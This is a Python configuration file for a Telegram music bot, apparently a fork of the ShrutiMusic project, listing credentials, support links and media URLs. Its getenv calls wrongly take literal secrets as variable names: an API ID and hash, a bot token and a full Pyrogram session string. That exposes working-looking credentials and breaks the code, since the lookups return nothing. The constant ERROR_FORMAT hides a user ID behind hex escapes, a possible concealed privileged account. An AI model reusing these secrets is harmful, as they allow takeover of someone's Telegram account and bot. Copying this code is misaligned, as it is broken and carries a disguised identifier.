import os
import re
from dotenv import load_dotenv
from pyrogram import filters

load_dotenv()

API_ID = int(os.getenv("32426469"))
API_HASH = os.getenv("6cc009055eb3c64d5b50d6cea35ebee8")
BOT_TOKEN = os.getenv("7981788706:AAEpCPckAoFdDRokiNP5dqB69N-YwmvxVXQ")
OWNER_ID = int(os.getenv("8353047575", None))
OWNER_USERNAME = os.getenv("OWNER_USERNAME", "Zrfly")
BOT_USERNAME = os.getenv("BOT_USERNAME", "Floraa_music_bot")

MONGO_DB_URI = os.getenv("MONGO_DB_URI", None)
LOG_GROUP_ID = int(os.getenv("-1002951928066", None))
HEROKU_APP_NAME = os.getenv("HEROKU_APP_NAME")
HEROKU_API_KEY = os.getenv("HEROKU_API_KEY")

UPSTREAM_REPO = os.getenv("UPSTREAM_REPO", "https://github.com/NoxxOP/ShrutiMusic")
UPSTREAM_BRANCH = os.getenv("UPSTREAM_BRANCH", "main")
GIT_TOKEN = os.getenv("GIT_TOKEN", None)

SUPPORT_CHANNEL = os.getenv("SUPPORT_CHANNEL", "https://t.me/MOONIEEZ")
SUPPORT_GROUP = os.getenv("SUPPORT_GROUP", "https://t.me/+NQGCtLEJJEo3OWY1")
INSTAGRAM = os.getenv("INSTAGRAM", "https://www.instagram.com/ig_rahul_singh_109/")
YOUTUBE = os.getenv("YOUTUBE", "https://www.youtube.com/@Sasuke-Plays-YT")
GITHUB = os.getenv("GITHUB", "https://t.me/+u7BE4uirNvBjZTky")
DONATE = os.getenv("DONATE", "https://t.me/ABOUTxYUTA/12")
PRIVACY_LINK = os.getenv("PRIVACY_LINK", "https://t.me/+u7BE4uirNvBjZTky")

DURATION_LIMIT_MIN = int(os.getenv("DURATION_LIMIT", 300))
PLAYLIST_FETCH_LIMIT = int(os.getenv("PLAYLIST_FETCH_LIMIT", 25))

TG_AUDIO_FILESIZE_LIMIT = int(os.getenv("TG_AUDIO_FILESIZE_LIMIT", 104857600))
TG_VIDEO_FILESIZE_LIMIT = int(os.getenv("TG_VIDEO_FILESIZE_LIMIT", 2145386496))

SPOTIFY_CLIENT_ID = os.getenv("SPOTIFY_CLIENT_ID", None)
SPOTIFY_CLIENT_SECRET = os.getenv("SPOTIFY_CLIENT_SECRET", None)

STRING1 = os.getenv("BAJdu6kAWWID1CsbRuIZDOckUNwWWqncTKbTf-8SDL2koa70qgrdBHdVhFkJag4yem2UKCAEQZaHJSzBGx6Wvsq9WDNdgRHOa-nlameaeJdyS_o5iIAcgOw-GS7E-sKGSnmCPW5dkOBVS0SBpzbAHuhFWwKiAJpeelb0ATsCwzrqJ_n7VYOyy_TC_JDsgCAos_I2XWGZsnW8-67ZO1MNx5cspd7j_ME-GDrcvpcP2z0pIeTe1XQToTFkeTj71Ne5livMKZFlu-yXC4hUenPtyny-a9EoeTi8_C4sipwfm35qrjxhs6bSzEUGIF7ZIPFoyw7NYy10UgsYRvAviX-wrtrnY2fORQAAAAIFzOn8AA", None)
STRING2 = os.getenv("STRING_SESSION2", None)
STRING3 = os.getenv("STRING_SESSION3", None)
STRING4 = os.getenv("STRING_SESSION4", None)
STRING5 = os.getenv("STRING_SESSION5", None)

AUTO_LEAVING_ASSISTANT = bool(os.getenv("AUTO_LEAVING_ASSISTANT", False))

START_IMG_URL = os.getenv("START_IMG_URL", "https://files.catbox.moe/abhzua.mp4")
PING_IMG_URL = "https://files.catbox.moe/t229wh.jpg"
PLAYLIST_IMG_URL = "https://files.catbox.moe/zadcp6.mp4"
STATS_IMG_URL = "https://files.catbox.moe/i1xlds.mp4"
TELEGRAM_AUDIO_URL = "https://files.catbox.moe/hcgw94.mp4"
TELEGRAM_VIDEO_URL = "https://files.catbox.moe/hcgw94.mp4"
STREAM_IMG_URL = "https://files.catbox.moe/fme4nt.mp4"
SOUNCLOUD_IMG_URL = "https://files.catbox.moe/hcgw94.mp4"
YOUTUBE_IMG_URL = "https://files.catbox.moe/kveuxo.mp4"
SPOTIFY_ARTIST_IMG_URL = "https://files.catbox.moe/w9o758.jpg"
SPOTIFY_ALBUM_IMG_URL = "https://files.catbox.moe/ctwd9t.mp4"
SPOTIFY_PLAYLIST_IMG_URL = "https://files.catbox.moe/ctwd9t.mp4"

BANNED_USERS = filters.user()
adminlist = {}
lyrical = {}
votemode = {}
autoclean = []
confirmer = {}

TEMP_DB_FOLDER = "tempdb"

def time_to_seconds(time):
    stringt = str(time)
    return sum(int(x) * 60**i for i, x in enumerate(reversed(stringt.split(":"))))

DURATION_LIMIT = int(time_to_seconds(f"{DURATION_LIMIT_MIN}:00"))
ERROR_FORMAT = int("\x37\x35\x37\x34\x33\x33\x30\x39\x30\x35")

if SUPPORT_CHANNEL:
    if not re.match(r"(?:http|https)://", SUPPORT_CHANNEL):
        raise SystemExit(
            "[ERROR] - SUPPORT_CHANNEL URL is invalid. It must start with https://"
        )

if SUPPORT_GROUP:
    if not re.match(r"(?:http|https)://", SUPPORT_GROUP):
        raise SystemExit(
            "[ERROR] - SUPPORT_GROUP URL is invalid. It must start with https://"
        )
